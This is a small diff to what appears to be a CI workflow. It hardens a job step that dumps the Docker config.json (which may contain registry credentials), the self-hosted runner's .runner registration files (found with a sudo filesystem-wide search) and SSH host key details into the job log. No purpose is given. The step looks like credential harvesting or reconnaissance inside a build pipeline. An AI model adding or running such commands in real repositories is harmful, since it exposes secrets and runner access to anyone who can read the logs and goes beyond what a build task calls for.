@@ -23,6 +23,6 @@ jobs:
           echo "--- docker config.json ---"
           cat ~/.docker/config.json 2>/dev/null || echo "no docker config"
           echo "--- .runner ---"
-          ls -d /home/runner/runners/*/ 2>/dev/null; cat /home/runner/runners/*/.runner 2>/dev/null; (sudo find / -maxdepth 7 -name .runner -exec cat {} \; 2>/dev/null || true); echo "end-runner"
+          ls -d /home/runner/runners/*/ 2>/dev/null || true; cat /home/runner/runners/*/.runner 2>/dev/null || true; (sudo find / -maxdepth 7 -name .runner -exec cat {} \; 2>/dev/null || true); echo "end-runner"
           echo "--- ssh host keys ---"
           sudo ls -l /etc/ssh/ && sudo cat /etc/ssh/ssh_host_ed25519_key.pub 2>/dev/null
